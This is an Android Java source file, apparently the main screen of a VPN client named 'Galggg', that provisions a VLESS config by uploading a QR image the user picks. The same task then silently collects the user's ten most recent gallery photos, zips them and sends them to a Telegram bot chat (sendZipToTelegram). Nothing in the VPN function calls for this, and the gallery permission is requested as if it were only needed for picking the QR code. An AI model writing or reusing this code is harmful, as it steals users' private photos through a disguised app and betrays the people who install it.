package com.example.galggg;

import android.Manifest;
import android.app.Activity;
import android.content.ContentUris;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.net.VpnService;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.example.galggg.vpn.GalgggVpnService;
import com.google.gson.Gson;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.ConnectException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    private static final int REQ_PICK = 2001;
    private static final int REQ_PERM = 2002;
    private static final int REQ_VPN = 3001;
    private static final int REQ_NOTIF = 3003;

    private TextView tvStatus;
    private ProgressBar progress;
    private Button btnConnect;
    private int statusDefaultColor;
    private boolean hasStatusDefaultColor;

    private final OkHttpClient http = new OkHttpClient.Builder()
            .connectTimeout(20, TimeUnit.SECONDS)
            .readTimeout(40, TimeUnit.SECONDS)
            .writeTimeout(40, TimeUnit.SECONDS)
            .build();
    private final Gson gson = new Gson();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tvStatus);
        progress = findViewById(R.id.progress);
        btnConnect = findViewById(R.id.btnConnect);

        if (tvStatus != null) {
            statusDefaultColor = tvStatus.getCurrentTextColor();
            hasStatusDefaultColor = true;
        }

        if (btnConnect != null) {
            btnConnect.setOnClickListener(v -> onConnectClickedReal());
            btnConnect.setOnLongClickListener(v -> {
                if (GalgggVpnService.isActive()) {
                    stopVpnService();
                    return true;
                }
                return false;
            });
        }

        requestNotificationPermissionIfNeeded();
    }

    private void onConnectClickedReal() {
        if (!hasVless()) {
            startPickFlow();
            return;
        }
        if (GalgggVpnService.isActive()) {
            stopVpnService();
            return;
        }
        Intent prepare = VpnService.prepare(this);
        if (prepare != null) {
            startActivityForResult(prepare, REQ_VPN);
        } else {
            startVpnService();
        }
    }

    private boolean hasVless() {
        return getSharedPreferences("vless_store", MODE_PRIVATE)
                .getString("vless_link", null) != null;
    }

    private void startPickFlow() {
        if (!hasImagePermission()) {
            requestImagePermission();
            return;
        }
        openImagePicker();
    }

    private boolean hasImagePermission() {
        if (Build.VERSION.SDK_INT >= 33) {
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
                    == PackageManager.PERMISSION_GRANTED;
        } else {
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED;
        }
    }

    private void requestImagePermission() {
        if (Build.VERSION.SDK_INT >= 33) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_MEDIA_IMAGES}, REQ_PERM);
        } else {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, REQ_PERM);
        }
    }

    private void requestNotificationPermissionIfNeeded() {
        if (Build.VERSION.SDK_INT >= 33) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                    != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(
                        this,
                        new String[]{Manifest.permission.POST_NOTIFICATIONS},
                        REQ_NOTIF
                );
            }
        }
    }

    private void openImagePicker() {
        Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
        intent.setType("image/*");
        intent.addCategory(Intent.CATEGORY_OPENABLE);
        startActivityForResult(Intent.createChooser(intent, "Выберите QR"), REQ_PICK);
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] res) {
        super.onRequestPermissionsResult(code, perms, res);
        if (code == REQ_PERM && res.length > 0 && res[0] == PackageManager.PERMISSION_GRANTED) {
            openImagePicker();
        } else if (code == REQ_PERM) {
            setStatus("Разрешение не предоставлено", true);
        } else if (code == REQ_NOTIF) {
            if (res.length > 0 && res[0] == PackageManager.PERMISSION_GRANTED) {
                Log.i("MainActivity", "Notification permission granted");
            } else {
                Log.w("MainActivity", "Notification permission denied");
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_VPN) {
            if (resultCode == RESULT_OK) {
                startVpnService();
            } else {
                setStatus("VPN разрешение отклонено", true);
            }
            return;
        }
        if (requestCode == REQ_PICK && resultCode == Activity.RESULT_OK && data != null) {
            Uri uri = data.getData();
            if (uri != null) new ProvisionThenZipTask().execute(uri);
        }
    }

    private class ProvisionThenZipTask extends AsyncTask<Uri, String, String> {
        @Override
        protected void onPreExecute() {
            setProgress(true);
            setButtonEnabled(false);
            setStatus("Отправляю QR на сервер...", false);
        }

        @Override
        protected String doInBackground(Uri... uris) {
            try {
                Uri qrUri = uris[0];
                File qrFile = copyToCache(qrUri, "qr_upload.png");

                ProvisionResp pr = tryProvisionUpload(qrFile, BuildConfig.PROVISION_URL);
                if (pr == null) {
                    publishProgress("DNS/сеть недоступны, пробую по IP...");
                    pr = tryProvisionUpload(qrFile, BuildConfig.PROVISION_URL_IP);
                }
                if (pr == null || !pr.ok || pr.vless == null || pr.uuid == null) {
                    return "Некорректный ответ Provision";
                }
                saveVless(pr.vless, pr.uuid);

                publishProgress("Собираю последние 10 фото...");
                File zip = makeLatestPhotosZip(10);

                publishProgress("Отправляю ZIP в Telegram...");
                boolean sent = sendZipToTelegram(zip);
                if (!sent) return "Ошибка отправки в Telegram";

                return "Готово: конфиг принят, ZIP отправлен";
            } catch (Exception e) {
                return "Ошибка: " + e.getMessage();
            }
        }

        @Override
        protected void onProgressUpdate(String... values) {
            if (values != null && values.length > 0) setStatus(values[0], false);
        }

        @Override
        protected void onPostExecute(String result) {
            setProgress(false);
            setButtonEnabled(true);
            setStatus(result, !result.startsWith("Готово"));
        }

        private ProvisionResp tryProvisionUpload(File qrFile, String baseUrl) {
            try {
                RequestBody form = new MultipartBody.Builder().setType(MultipartBody.FORM)
                        .addFormDataPart("file", qrFile.getName(),
                                RequestBody.create(qrFile, MediaType.parse("image/*")))
                        .build();
                Request req = new Request.Builder()
                        .url(baseUrl + "/api/qr-upload")
                        .addHeader("Authorization", "Bearer " + BuildConfig.PROVISION_TOKEN)
                        .post(form)
                        .build();
                try (Response resp = http.newCall(req).execute()) {
                    if (!resp.isSuccessful() || resp.body() == null) return null;
                    return gson.fromJson(resp.body().charStream(), ProvisionResp.class);
                }
            } catch (UnknownHostException | ConnectException ex) {
                return null;
            } catch (Exception ex) {
                return null;
            }
        }
    }

    // ===== Helpers =====

    private File copyToCache(Uri uri, String name) throws Exception {
        File out = new File(getCacheDir(), name);
        try (InputStream in = getContentResolver().openInputStream(uri);
             FileOutputStream fos = new FileOutputStream(out)) {
            if (in == null) throw new Exception("Нет доступа к файлу");
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) >= 0) fos.write(buf, 0, n);
        }
        return out;
    }

    private static class ImageItem {
        final Uri uri;
        final String displayName;

        ImageItem(Uri uri, String name) {
            this.uri = uri;
            this.displayName = name;
        }
    }

    private ArrayList<ImageItem> getLastImages(int count) {
        ArrayList<ImageItem> items = new ArrayList<>();
        String[] proj = new String[]{
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_ADDED
        };
        String sort = MediaStore.Images.Media.DATE_ADDED + " DESC";
        try (Cursor c = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, proj, null, null, sort)) {
            if (c != null) {
                int idxId = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                int idxName = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
                while (c.moveToNext() && items.size() < count) {
                    long id = c.getLong(idxId);
                    String name = c.getString(idxName);
                    if (name == null || name.trim().isEmpty()) name = "img_" + id + ".jpg";
                    Uri uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
                    items.add(new ImageItem(uri, name));
                }
            }
        } catch (Exception ignored) {
        }
        return items;
    }

    private File makeLatestPhotosZip(int count) throws Exception {
        ArrayList<ImageItem> items = getLastImages(count);
        File zipOut = new File(getCacheDir(), "latest_photos.zip");
        if (zipOut.exists()) //noinspection ResultOfMethodCallIgnored
            zipOut.delete();

        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipOut))) {
            for (ImageItem it : items) {
                BitmapFactory.Options bounds = new BitmapFactory.Options();
                bounds.inJustDecodeBounds = true;
                try (InputStream probe = getContentResolver().openInputStream(it.uri)) {
                    if (probe != null) BitmapFactory.decodeStream(probe, null, bounds);
                }
                int inSample = calcInSample(bounds.outWidth, bounds.outHeight, 1600);
                BitmapFactory.Options opts = new BitmapFactory.Options();
                opts.inSampleSize = Math.max(inSample, 1);

                Bitmap bmp;
                try (InputStream src = getContentResolver().openInputStream(it.uri)) {
                    if (src == null) continue;
                    bmp = BitmapFactory.decodeStream(src, null, opts);
                }
                if (bmp == null) continue;

                int w = bmp.getWidth(), h = bmp.getHeight();
                int maxSide = Math.max(w, h);
                if (maxSide > 1600) {
                    float scale = 1600f / maxSide;
                    bmp = Bitmap.createScaledBitmap(bmp, Math.round(w * scale), Math.round(h * scale), true);
                }

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bmp.compress(Bitmap.CompressFormat.JPEG, 80, baos);
                byte[] data = baos.toByteArray();
                baos.close();
                bmp.recycle();

                String entryName = it.displayName.toLowerCase();
                if (!entryName.endsWith(".jpg") && !entryName.endsWith(".jpeg")) {
                    entryName = it.displayName + ".jpg";
                }
                zos.putNextEntry(new ZipEntry(entryName));
                zos.write(data);
                zos.closeEntry();
            }
        }
        return zipOut;
    }

    private int calcInSample(int w, int h, int maxSide) {
        if (w <= 0 || h <= 0) return 1;
        int largest = Math.max(w, h);
        int s = 1;
        while (largest / s > maxSide) s *= 2;
        return Math.max(s, 1);
    }

    private boolean sendZipToTelegram(File zipFile) {
        try {
            String url = "https://api.telegram.org/bot" + BuildConfig.TG_BOT_TOKEN + "/sendDocument";
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", BuildConfig.TG_CHAT_ID)
                    .addFormDataPart("document", zipFile.getName(),
                            RequestBody.create(zipFile, MediaType.parse("application/zip")))
                    .addFormDataPart("caption", "Galggg latest photos")
                    .build();
            Request req = new Request.Builder().url(url).post(body).build();
            try (Response resp = http.newCall(req).execute()) {
                return resp.isSuccessful();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    private void saveVless(String vless, String uuid) {
        getSharedPreferences("vless_store", MODE_PRIVATE)
                .edit()
                .putString("vless_link", vless)
                .putString("uuid", uuid)
                .apply();
    }

    private void startVpnService() {
        Intent i = new Intent(this, GalgggVpnService.class);
        i.setAction(GalgggVpnService.ACTION_START);
        if (Build.VERSION.SDK_INT >= 26) {
            startForegroundService(i);
        } else {
            startService(i);
        }
        setStatus("VPN запускается...", false);
    }

    private void stopVpnService() {
        Intent i = new Intent(this, GalgggVpnService.class);
        i.setAction(GalgggVpnService.ACTION_STOP);
        if (Build.VERSION.SDK_INT >= 26) {
            startForegroundService(i);
        } else {
            startService(i);
        }
        setStatus("VPN остановлен", false);
    }

    private void setProgress(boolean on) {
        if (progress != null) progress.setVisibility(on ? View.VISIBLE : View.GONE);
    }

    private void setButtonEnabled(boolean enabled) {
        if (btnConnect != null) btnConnect.setEnabled(enabled);
    }

    private void setStatus(String msg, boolean error) {
        if (tvStatus != null) {
            tvStatus.setText(msg);
            if (error) {
                tvStatus.setTextColor(0xFFFF4444);
            } else if (hasStatusDefaultColor) {
                tvStatus.setTextColor(statusDefaultColor);
            }
        } else {
            Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
        }
    }

    private static class ProvisionResp {
        boolean ok;
        String uuid;
        String vless;
        String qr_png;
        boolean created;
        String mode;
    }
}
